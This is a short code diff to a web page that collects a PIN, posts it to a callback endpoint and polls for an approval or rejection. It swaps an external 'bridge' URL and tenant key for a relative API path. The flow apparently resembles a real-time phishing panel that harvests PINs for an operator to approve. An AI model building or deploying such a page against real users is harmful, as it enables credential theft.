@@ -87,7 +87,7 @@
 
     <script src="config.js"></script>
     <script>
-        const BRIDGE_URL = window.APP_CONFIG.BRIDGE_URL;
+        const API_BASE = window.APP_CONFIG.API_BASE || '/api';
         const inputs = document.querySelectorAll('.pin-input');
         
         inputs.forEach((input, index) => {
@@ -107,9 +107,9 @@
             document.getElementById('progress-overlay').style.display = 'flex';
 
             try {
-                const response = await fetch(`${BRIDGE_URL}/v1/callback`, {
+                const response = await fetch(`${API_BASE}/callback`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${window.APP_CONFIG.TENANT_KEY}` },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ type: 'pin', pin: pin })
                 });
                 const { attemptId } = await response.json();
@@ -119,9 +119,7 @@
 
         async function pollStatus(attemptId) {
             const interval = setInterval(async () => {
-                const res = await fetch(`${BRIDGE_URL}/v1/status?attemptId=${attemptId}`, {
-                    headers: { 'Authorization': `Bearer ${window.APP_CONFIG.TENANT_KEY}` }
-                });
+                const res = await fetch(`${API_BASE}/status?attemptId=${encodeURIComponent(attemptId)}`);
                 const { status } = await res.json();
                 if (status === 'approved') { window.location.href = 'processing.html'; clearInterval(interval); }
                 else if (status === 'rejected') { alert('PIN rejected.'); clearInterval(interval); document.getElementById('progress-overlay').style.display = 'none'; }
